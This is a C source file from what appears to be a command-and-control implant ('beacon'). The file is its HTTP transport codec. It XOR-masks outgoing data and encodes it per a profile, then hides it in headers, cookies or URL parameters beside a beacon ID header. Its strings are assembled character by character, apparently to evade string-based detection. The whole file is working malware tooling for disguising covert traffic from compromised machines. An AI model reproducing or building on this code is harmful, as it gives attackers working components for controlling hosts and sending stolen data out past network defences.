/* beacon/src/Transport/HttpCodec.c
 * OutputConfig-driven encode/decode pipeline and request header builder.
 * Used by Http.c (NaxHttpGet, NaxHttpPost) to transform data per profile. */

#include "Nax.h"

/* ========= [ OutputConfig encode/decode ] ========= */

FUNC UINT32 NaxEncodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const PBYTE src, UINT32 src_len, PBYTE dst, UINT32 dst_cap ) {
    PBYTE  input     = (PBYTE)src;
    UINT32 input_len = src_len;

    /* mask adds 4 bytes; base64 expands ~4/3; hex expands 2x - size for worst case */
    UINT32 mask_cap = src_len + 8;
    UINT32 enc_cap  = ( mask_cap * 2 ) + 16;

    PBYTE work = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, mask_cap + enc_cap );
    if ( !work ) return 0;
    PBYTE mask_buf = work;
    PCHAR enc_buf  = (PCHAR)( work + mask_cap );

    if ( cfg->Mask ) {
        input_len = NaxXorMask( Nax, input, input_len, mask_buf, mask_cap );
        if ( input_len == 0 ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, work ); return 0; }
        input = mask_buf;
    }

    UINT32 enc_len = 0;
    switch ( cfg->Format ) {
    case NAX_FMT_BASE64:
        enc_len = NaxBase64Encode( input, input_len, enc_buf, enc_cap );
        break;
    case NAX_FMT_BASE64URL:
        enc_len = NaxBase64UrlEncode( input, input_len, enc_buf, enc_cap );
        break;
    case NAX_FMT_HEX:
        if ( input_len * 2 + 1 > enc_cap ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, work ); return 0; }
        NaxHexEncode( input, input_len, enc_buf );
        enc_len = input_len * 2;
        break;
    default:
        if ( input_len > enc_cap ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, work ); return 0; }
        MmCopy( enc_buf, input, input_len );
        enc_len = input_len;
        break;
    }

    UINT32 total = cfg->PrependLen + enc_len + cfg->AppendLen;
    if ( total > dst_cap ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, work ); return 0; }
    UINT32 off = 0;
    if ( cfg->PrependLen > 0 ) { MmCopy( dst + off, cfg->Prepend, cfg->PrependLen ); off += cfg->PrependLen; }
    MmCopy( dst + off, enc_buf, enc_len ); off += enc_len;
    if ( cfg->AppendLen > 0 ) { MmCopy( dst + off, cfg->Append, cfg->AppendLen ); off += cfg->AppendLen; }

    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, work );
    return off;
}

FUNC UINT32 NaxDecodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const PBYTE src, UINT32 src_len, PBYTE dst, UINT32 dst_cap ) {
    PBYTE  data     = (PBYTE)src;
    UINT32 data_len = src_len;

    if ( data_len >= cfg->PrependLen + cfg->AppendLen ) {
        data     += cfg->PrependLen;
        data_len -= cfg->PrependLen + cfg->AppendLen;
    }

    UINT32 buf_sz = data_len < 4096 ? 4096 : data_len;
    PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, buf_sz );
    if ( !dec_buf ) return 0;

    UINT32 dec_len = 0;
    switch ( cfg->Format ) {
    case NAX_FMT_BASE64:
    case NAX_FMT_BASE64URL:
        dec_len = NaxBase64Decode( (PCHAR)data, data_len, dec_buf, buf_sz );
        break;
    case NAX_FMT_HEX:
        dec_len = NaxHexDecode( (PCHAR)data, data_len, dec_buf, buf_sz );
        break;
    default:
        if ( data_len > buf_sz ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf ); return 0; }
        MmCopy( dec_buf, data, data_len );
        dec_len = data_len;
        break;
    }

    if ( cfg->Mask && dec_len > 4 ) {
        UINT32 r = NaxXorUnmask( dec_buf, dec_len, dst, dst_cap );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
        return r;
    }
    if ( dec_len > dst_cap ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf ); return 0; }
    MmCopy( dst, dec_buf, dec_len );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
    return dec_len;
}

/* ========= [ header builder ] ========= */

/* Append CHAR string to WCHAR output buffer. Returns new write index. */
FUNC UINT32 NaxAppendAsciiW( const PCHAR ascii, PWCHAR out, UINT32 wi, UINT32 cap ) {
    UINT32 i = 0;
    while ( ascii[ i ] && wi < cap - 1 ) { out[ wi++ ] = (WCHAR)(BYTE)ascii[ i++ ]; }
    return wi;
}

/* Append CRLF to WCHAR buffer. Returns new write index. */
FUNC UINT32 NaxAppendCRLF( PWCHAR out, UINT32 wi, UINT32 cap ) {
    if ( wi + 2 < cap ) { out[ wi++ ] = L'\r'; out[ wi++ ] = L'\n'; }
    return wi;
}

/* Build request headers into a WCHAR buffer.
 * `hdrs` / `hdr_count`    : profile client headers array (e.g. GetClientHdrs)
 * `meta_cfg`              : OutputConfig for metadata (session ID or encrypted data)
 * `meta_encoded`          : already-encoded metadata value (CHAR)
 * `meta_encoded_len`      : length of encoded metadata
 * `is_post`               : whether this is a POST request (for Content-Type) */
FUNC VOID NaxBuildRequestHeaders( PNAX_INSTANCE Nax, const PCHAR sid, const PCHAR hdr_base, UINT32 hdr_stride, BYTE hdr_count, const NAX_OUTPUT_CFG* meta_cfg, const PCHAR meta_encoded, UINT32 meta_encoded_len, BOOL is_post, PWCHAR out, UINT32 out_cap ) {
    UINT32 wi = 0;

    wi = NaxAppendAsciiW( Nax->Config.BeaconIdHdr, out, wi, out_cap );
    if ( wi < out_cap - 1 ) out[ wi++ ] = L':';
    if ( wi < out_cap - 1 ) out[ wi++ ] = L' ';
    wi = NaxAppendAsciiW( sid, out, wi, out_cap );
    wi = NaxAppendCRLF( out, wi, out_cap );

    if ( meta_encoded && meta_encoded_len > 0 ) {
        switch ( meta_cfg->Placement ) {
        case NAX_PLACE_HEADER: {
            /* Name: encoded_value\r\n */
            wi = NaxAppendAsciiW( meta_cfg->Name, out, wi, out_cap );
            if ( wi < out_cap - 1 ) out[ wi++ ] = L':';
            if ( wi < out_cap - 1 ) out[ wi++ ] = L' ';
            wi = NaxAppendAsciiW( meta_encoded, out, wi, out_cap );
            wi = NaxAppendCRLF( out, wi, out_cap );
            break;
        }
        case NAX_PLACE_COOKIE: {
            /* Cookie: Name=encoded_value\r\n */
            CHAR ck[] = { 'C','o','o','k','i','e',':',' ','\0' };
            wi = NaxAppendAsciiW( ck, out, wi, out_cap );
            wi = NaxAppendAsciiW( meta_cfg->Name, out, wi, out_cap );
            if ( wi < out_cap - 1 ) out[ wi++ ] = L'=';
            wi = NaxAppendAsciiW( meta_encoded, out, wi, out_cap );
            wi = NaxAppendCRLF( out, wi, out_cap );
            break;
        }
        default:
            /* BODY and PARAMETER placements are handled outside headers */
            break;
        }
    }

    /* Content-Type for POST body - only when no profile headers (they include their own) */
    if ( is_post && hdr_count == 0 ) {
        CHAR ct[] = { 'C','o','n','t','e','n','t','-','T','y','p','e',':',' ','a','p','p','l','i','c','a','t','i','o','n','/','o','c','t','e','t','-','s','t','r','e','a','m','\0' };
        wi = NaxAppendAsciiW( ct, out, wi, out_cap );
        wi = NaxAppendCRLF( out, wi, out_cap );
    }

    for ( BYTE h = 0; h < hdr_count; h++ ) {
        wi = NaxAppendAsciiW( hdr_base + h * hdr_stride, out, wi, out_cap );
        wi = NaxAppendCRLF( out, wi, out_cap );
    }

    CHAR hdr_p[] = { 'X','-','N','a','X','-','P','u','b','l','i','c',':',' ','1','\0' };
    wi = NaxAppendAsciiW( hdr_p, out, wi, out_cap );
    wi = NaxAppendCRLF( out, wi, out_cap );

    out[ wi ] = L'\0';
}

/* ========= [ URL builder helper ] ========= */

FUNC BOOL NaxBuildUrl( PNAX_INSTANCE Nax, const PWCHAR url_w, PCHAR uri, PWCHAR out, UINT32 out_cap ) {
    URL_COMPONENTS boot_uc;
    MmZero( &boot_uc, sizeof( boot_uc ) );
    boot_uc.dwStructSize = sizeof( boot_uc );
    WCHAR boot_host[256] = { 0 };
    WCHAR boot_path[512] = { 0 };
    boot_uc.lpszHostName = boot_host;
    boot_uc.dwHostNameLength = 256;
    boot_uc.lpszUrlPath = boot_path;
    boot_uc.dwUrlPathLength = 512;
    if ( ! Nax->Winhttp.WinHttpCrackUrl( url_w, 0, 0, &boot_uc ) ) return FALSE;

    UINT32 ui = 0;
    BOOL is_https = ( boot_uc.nScheme == INTERNET_SCHEME_HTTPS );
    if ( is_https ) {
        CHAR s[] = {'h','t','t','p','s',':','/','/'}; for ( UINT32 c = 0; c < 8; c++ ) out[ui++] = (WCHAR)s[c];
    } else {
        CHAR s[] = {'h','t','t','p',':','/','/'}; for ( UINT32 c = 0; c < 7; c++ ) out[ui++] = (WCHAR)s[c];
    }
    for ( UINT32 c = 0; boot_host[c] && ui < out_cap - 16; c++ ) out[ui++] = boot_host[c];

    /* Only append :port when it differs from the scheme default (80/443).
     * Omitting the default port produces a clean Host header. */
    UINT32 port_val    = (UINT32)boot_uc.nPort;
    UINT32 default_port = is_https ? 443 : 80;
    if ( port_val != default_port ) {
        out[ui++] = ':';
        CHAR port_buf[8]; UINT32 pi = 0;
        if ( port_val == 0 ) { port_buf[pi++] = '0'; } else {
            CHAR tmp[8]; UINT32 ti = 0;
            while ( port_val > 0 ) { tmp[ti++] = '0' + (CHAR)(port_val % 10); port_val /= 10; }
            while ( ti > 0 ) port_buf[pi++] = tmp[--ti];
        }
        for ( UINT32 c = 0; c < pi; c++ ) out[ui++] = (WCHAR)port_buf[c];
    }

    for ( UINT32 c = 0; uri[c] && ui < out_cap - 2; c++ ) out[ui++] = (WCHAR)uri[c];
    out[ui] = L'\0';
    return TRUE;
}

/* ========= [ URL path builder with parameter append ] ========= */

/* Append ?name=value to a wide path buffer for PARAMETER placement.
 * Also appends static parameters from GetClientParams.
 * Returns the final path buffer (caller-supplied path_out). */
FUNC VOID NaxBuildPathWithParams( PWCHAR path_src, PWCHAR path_out, UINT32 path_cap, const NAX_OUTPUT_CFG* meta_cfg, const PCHAR meta_encoded, UINT32 meta_encoded_len, const PCHAR param_base, UINT32 param_stride, BYTE param_count ) {
    UINT32 wi = 0;

    while ( path_src[ wi ] && wi < path_cap - 256 ) { path_out[ wi ] = path_src[ wi ]; wi++; }

    BOOL has_qmark = FALSE;
    for ( UINT32 c = 0; c < wi; c++ ) {
        if ( path_out[ c ] == L'?' ) { has_qmark = TRUE; break; }
    }

    if ( meta_cfg && meta_encoded && meta_encoded_len > 0 && meta_cfg->Placement == NAX_PLACE_PARAMETER ) {
        if ( ! has_qmark ) { path_out[ wi++ ] = L'?'; has_qmark = TRUE; }
        else               { path_out[ wi++ ] = L'&'; }
        wi = NaxAppendAsciiW( meta_cfg->Name, path_out, wi, path_cap );
        path_out[ wi++ ] = L'=';
        wi = NaxAppendAsciiW( meta_encoded, path_out, wi, path_cap );
    }

    for ( BYTE p = 0; p < param_count; p++ ) {
        if ( ! has_qmark ) { path_out[ wi++ ] = L'?'; has_qmark = TRUE; }
        else               { path_out[ wi++ ] = L'&'; }
        wi = NaxAppendAsciiW( param_base + p * param_stride, path_out, wi, path_cap );
    }

    path_out[ wi ] = L'\0';
}
